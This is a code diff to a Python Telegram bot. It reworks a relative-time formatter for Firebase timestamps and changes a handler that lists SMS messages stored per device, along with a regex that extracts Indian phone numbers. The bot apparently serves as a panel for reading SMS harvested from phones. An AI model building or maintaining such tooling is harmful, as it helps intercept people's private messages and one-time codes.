@@ -193,43 +193,50 @@ def extract_phone(messages_dict):
     match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
     return match.group(1) if match else None
 
-def format_relative_time(time_str):
+def format_relative_time(time_val):
     """
-    Parses timestamp strings and converts them to:
-    - Seconds: 'Xs ago'
-    - Minutes: 'Xm ago'
-    - Hours: 'Xh ago'
-    - Days: 'Xd ago'
-    Falls back gracefully if the timestamp is missing instead of showing N/A.
+    Accurately parses Firebase timestamps (numerical epoch ms/s or strings) 
+    and converts them to true relative formats: 'Xs ago', 'Xm ago', 'Xh ago', 'Xd ago'.
     """
     try:
-        time_str = str(time_str).strip().upper()
-        if not time_str or time_str == "N/A" or time_str == "NONE":
-            return "Just now"
-            
-        dt = None
-        dt_match = re.search(r'(\d{2})-(\d{2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)', time_str)
-        if dt_match:
-            d, m, y, h, mn, s, period = dt_match.groups()
-            hour = int(h)
-            if period == "PM" and hour != 12:
-                hour += 12
-            if period == "AM" and hour == 12:
-                hour = 0
-            sec = int(s) if s else 0
-            dt = datetime(int(y), int(m), int(d), hour, int(mn), sec)
+        if isinstance(time_val, (int, float)):
+            if time_val > 100000000000:
+                time_val = time_val / 1000.0
+            dt = datetime.fromtimestamp(time_val)
         else:
-            t_match = re.search(r'(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)', time_str)
-            if t_match:
-                h, mn, s, period = t_match.groups()
-                hour = int(h)
-                if period == "PM" and hour != 12:
-                    hour += 12
-                if period == "AM" and hour == 12:
-                    hour = 0
-                sec = int(s) if s else 0
-                now = datetime.now()
-                dt = datetime(now.year, now.month, now.day, hour, int(mn), sec)
+            time_str = str(time_val).strip().upper()
+            if not time_str or time_str in ["N/A", "NONE", "NULL"]:
+                return "Just now"
+            
+            if time_str.isdigit() or (time_str.replace('.', '', 1).isdigit()):
+                val = float(time_str)
+                if val > 100000000000:
+                    val = val / 1000.0
+                dt = datetime.fromtimestamp(val)
+            else:
+                dt = None
+                dt_match = re.search(r'(\d{2})-(\d{2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)', time_str)
+                if dt_match:
+                    d, m, y, h, mn, s, period = dt_match.groups()
+                    hour = int(h)
+                    if period == "PM" and hour != 12:
+                        hour += 12
+                    if period == "AM" and hour == 12:
+                        hour = 0
+                    sec = int(s) if s else 0
+                    dt = datetime(int(y), int(m), int(d), hour, int(mn), sec)
+                else:
+                    t_match = re.search(r'(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)', time_str)
+                    if t_match:
+                        h, mn, s, period = t_match.groups()
+                        hour = int(h)
+                        if period == "PM" and hour != 12:
+                            hour += 12
+                        if period == "AM" and hour == 12:
+                            hour = 0
+                        sec = int(s) if s else 0
+                        now = datetime.now()
+                        dt = datetime(now.year, now.month, now.day, hour, int(mn), sec)
 
         if dt:
             diff = datetime.now() - dt
@@ -248,7 +255,7 @@ def format_relative_time(time_str):
             
             minutes = total_seconds // 60
             if minutes < 1:
-                return f"{total_seconds}s ago"
+                return f"{max(1, total_seconds)}s ago"
             return f"{minutes}m ago"
     except Exception:
         pass
@@ -720,7 +727,7 @@ async def cb_show_device_sms(callback: types.CallbackQuery):
                 if isinstance(msgs, dict):
                     for m_key, m_val in reversed(list(msgs.items())):
                         if isinstance(m_val, dict):
-                            raw_time = str(m_val.get("time") or m_val.get("timestamp") or "N/A")
+                            raw_time = m_val.get("time") or m_val.get("timestamp") or m_val.get("date") or "N/A"
                             time_ago = format_relative_time(raw_time)
                             body_str = str(m_val.get("body") or m_val.get("message") or "N/A")
                             sender_str = str(m_val.get("sender") or m_val.get("title") or "SMS")
